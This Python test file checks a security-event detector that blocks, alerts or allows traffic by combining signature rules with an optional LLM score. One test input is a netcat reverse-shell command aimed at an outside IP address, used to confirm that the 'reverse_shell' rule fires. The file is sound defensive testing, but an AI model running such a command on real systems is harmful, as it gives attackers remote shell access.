"""Rules + the combined decision: what must be stopped, and why."""

import pandas as pd
import pytest

from detect.rules import action_for, apply_rules
from detect.score import make_scorer

QUIET = dict(
    source_ip="192.168.1.10", event_type="HTTP_REQUEST", is_internal_ip=1,
    requests_1m=40, failed_logins_1m=0, failed_logins_5m=0, unique_users_5m=1,
    port_scan_count_5m=0, unique_ports_5m=0, commands_executed_5m=0,
    login_frequency=0.0, is_night=0, command="", url_path="/dashboard",
    http_status=200, user_agent="Mozilla/5.0", request_signature="",
    is_attack_signature=0, is_scanner_agent=0, is_sensitive_path=0,
    is_sensitive_command=0, is_privileged=0, process_uid=1001,
    sensitive_commands_5m=0, attack_signatures_5m=0, http_errors_5m=0,
    http_404_1m=0, distinct_paths_5m=3, bytes_sent_5m=200_000,
)


def _row(**overrides):
    return dict(QUIET, **overrides)


def _decide(*rows):
    out = make_scorer(llm=None)(pd.DataFrame(list(rows)))
    return out.to_dict("records")


@pytest.mark.parametrize(
    "overrides, rule",
    [
        (dict(request_signature="sqli", is_attack_signature=1), "sqli"),
        (dict(request_signature="path_traversal", is_attack_signature=1), "path_traversal"),
        (dict(is_scanner_agent=1), "scanner_agent"),
        (dict(event_type="COMMAND_EXECUTION", command="nc -e /bin/sh 1.2.3.4 4444"), "reverse_shell"),
        (dict(is_sensitive_command=1, is_privileged=1), "sensitive_command_as_root"),
        (dict(event_type="LOGIN_SUCCESS", failed_logins_5m=40), "login_after_brute_force"),
        (dict(failed_logins_1m=38), "brute_force"),
        (dict(unique_users_5m=9, failed_logins_5m=60), "password_spray"),
        (dict(unique_ports_5m=14), "port_scan"),
        (dict(port_scan_count_5m=8), "lateral_movement"),
        (dict(http_404_1m=45), "web_scan"),
        (dict(bytes_sent_5m=400_000_000), "data_exfiltration"),
    ],
)
def test_each_attack_is_blocked_with_its_reason(overrides, rule):
    [decision] = _decide(_row(**overrides))
    assert decision["recommended_action"] == "block"
    assert rule in decision["rule_hits"].split(",")


def test_normal_traffic_is_allowed():
    [decision] = _decide(_row())
    assert decision["recommended_action"] == "allow"
    assert decision["rule_hits"] == ""


@pytest.mark.parametrize(
    "overrides",
    [
        # all of these look alarming in isolation and are routine here
        dict(is_privileged=1, process_uid=0, command="rsync -a /srv/data /backup/data"),
        dict(http_status=404, http_404_1m=3),
        dict(requests_1m=800),
        dict(bytes_sent_5m=5_000_000),   # a legitimate monthly export
    ],
)
def test_benign_look_alikes_are_not_blocked(overrides):
    [decision] = _decide(_row(**overrides))
    assert decision["recommended_action"] == "allow"


def test_a_single_sensitive_path_probe_alerts_but_does_not_block():
    [decision] = _decide(_row(is_internal_ip=0, is_sensitive_path=1, http_status=404,
                              url_path="/.env"))
    assert decision["recommended_action"] == "alert"


def test_every_rule_that_fired_is_recorded_strongest_first():
    [decision] = _decide(_row(request_signature="sqli", is_attack_signature=1, is_scanner_agent=1))
    assert decision["rule_hits"] == "sqli,scanner_agent"
    assert decision["final_anomaly_score"] == pytest.approx(0.95)


def test_attacks_are_blocked_with_no_api_key_at_all():
    """Rules need no API. Signature attacks are stopped even with Groq down."""
    [decision] = _decide(_row(request_signature="sqli", is_attack_signature=1))
    assert decision["recommended_action"] == "block"
    assert decision["llm_reason"] == "skipped:rule_decided"


def test_the_llm_is_never_paid_for_what_the_rules_already_decided():
    class Spy:
        model = "spy"
        seen = []

        def score_frame(self, pdf):
            Spy.seen.extend(pdf["url_path"])
            pdf = pdf.copy()
            pdf["llm_score"], pdf["llm_reason"], pdf["llm_model"] = 0.0, "x", "spy"
            return pdf

    make_scorer(llm=Spy())(pd.DataFrame([
        _row(url_path="/inj", request_signature="sqli", is_attack_signature=1),
        _row(url_path="/grey", is_internal_ip=0, is_sensitive_path=1, http_status=404),
    ]))
    assert Spy.seen == ["/grey"]


def test_final_score_is_the_max_not_the_average():
    """An alert-level rule hit (0.70) must survive an LLM that shrugs (0.20).
    Averaged, it would fall to 0.45 -- below the alert line -- and be allowed."""

    class Shrugs:
        model = "m"

        def score_frame(self, pdf):
            pdf = pdf.copy()
            pdf["llm_score"], pdf["llm_reason"], pdf["llm_model"] = 0.2, "looks fine", "m"
            return pdf

    probe = _row(is_internal_ip=0, is_sensitive_path=1, http_status=404, url_path="/.env")
    [row] = make_scorer(llm=Shrugs())(pd.DataFrame([probe])).to_dict("records")
    assert row["final_anomaly_score"] == pytest.approx(0.70)
    assert row["recommended_action"] == "alert"


def test_the_llm_can_escalate_what_no_rule_caught():
    class Alarmed:
        model = "m"

        def score_frame(self, pdf):
            pdf = pdf.copy()
            pdf["llm_score"], pdf["llm_reason"], pdf["llm_model"] = 0.9, "odd sequence", "m"
            return pdf

    [row] = make_scorer(llm=Alarmed())(pd.DataFrame([_row()])).to_dict("records")
    assert row["recommended_action"] == "block"


def test_action_thresholds():
    assert action_for(0.95) == "block"
    assert action_for(0.70) == "alert"
    assert action_for(0.30) == "allow"


def test_empty_batch():
    scores, hits = apply_rules(pd.DataFrame())
    assert scores.empty and hits.empty
